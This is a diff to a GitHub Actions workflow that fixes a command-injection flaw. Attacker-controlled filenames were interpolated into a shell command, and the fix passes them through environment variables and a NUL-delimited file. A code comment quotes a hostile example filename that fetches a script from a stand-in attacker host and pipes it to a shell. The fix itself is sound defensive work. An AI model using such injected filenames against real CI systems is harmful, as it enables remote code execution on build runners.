@@ -78,29 +78,42 @@ jobs:
 
       - name: Determine added .md files under .agentile/
         id: added
+        env:
+          # EX-B-006: pass the diff refs through env (never interpolate ${{ }}
+          # into the script body). base/head are SHA-shaped, but keeping them in
+          # env is the same discipline the filename path below relies on.
+          EVENT_NAME: ${{ github.event_name }}
+          PR_BASE: ${{ github.event.pull_request.base.sha }}
+          PR_HEAD: ${{ github.event.pull_request.head.sha }}
+          PUSH_BASE: ${{ github.event.before }}
+          PUSH_HEAD: ${{ github.sha }}
         run: |
-          if [[ "${{ github.event_name }}" == "pull_request" ]]; then
-            base="${{ github.event.pull_request.base.sha }}"
-            head="${{ github.event.pull_request.head.sha }}"
+          if [[ "$EVENT_NAME" == "pull_request" ]]; then
+            base="$PR_BASE"; head="$PR_HEAD"
           else
-            base="${{ github.event.before }}"
-            head="${{ github.sha }}"
+            base="$PUSH_BASE"; head="$PUSH_HEAD"
           fi
-          # Diff filter A = added; we don't re-check Modified files here
-          # because the file-level ratchet in lint-frontmatter.yml owns that.
-          # Emit a SINGLE space-separated line (xargs) — a multiline value makes
-          # the consumer shell run filenames 2..N as commands (exit 126).
-          files=$(git diff --name-only --diff-filter=A "$base" "$head" -- '.agentile/**/*.md' \
-            | grep -v '^\.agentile/INDEX/' | xargs || true)
-          echo "files=$files" >> "$GITHUB_OUTPUT"
+          # EX-B-006: emit the file list as a NUL-delimited FILE, not a shell
+          # value. The old code interpolated attacker-controlled filenames via
+          # `--files ${{ steps.added.outputs.files }}`, so a PR adding a file
+          # named `pwned$(curl attacker|sh).md` ran that command on the runner.
+          # The consumer now reads this file with --files0; the only thing
+          # interpolated downstream is the constant path we choose here.
+          list="${RUNNER_TEMP:-/tmp}/added_frontmatter_files"
+          git diff --name-only -z --diff-filter=A "$base" "$head" -- '.agentile/**/*.md' \
+            | { grep -zv '^\.agentile/INDEX/' || true; } > "$list"
+          if [[ -s "$list" ]]; then has_files=1; else has_files=0; fi
+          echo "has_files=$has_files" >> "$GITHUB_OUTPUT"
+          echo "list=$list" >> "$GITHUB_OUTPUT"
 
       - name: Check frontmatter on added files
-        if: ${{ steps.added.outputs.files != '' }}
+        if: ${{ steps.added.outputs.has_files == '1' }}
+        env:
+          LIST: ${{ steps.added.outputs.list }}
         run: |
-          # shellcheck disable=SC2086
-          ./scripts/ci/check_frontmatter.py --files ${{ steps.added.outputs.files }}
+          ./scripts/ci/check_frontmatter.py --files0 "$LIST"
 
       - name: No new docs
-        if: ${{ steps.added.outputs.files == '' }}
+        if: ${{ steps.added.outputs.has_files == '0' }}
         run: |
           echo "No new .md files under .agentile/ in this change; nothing to check."
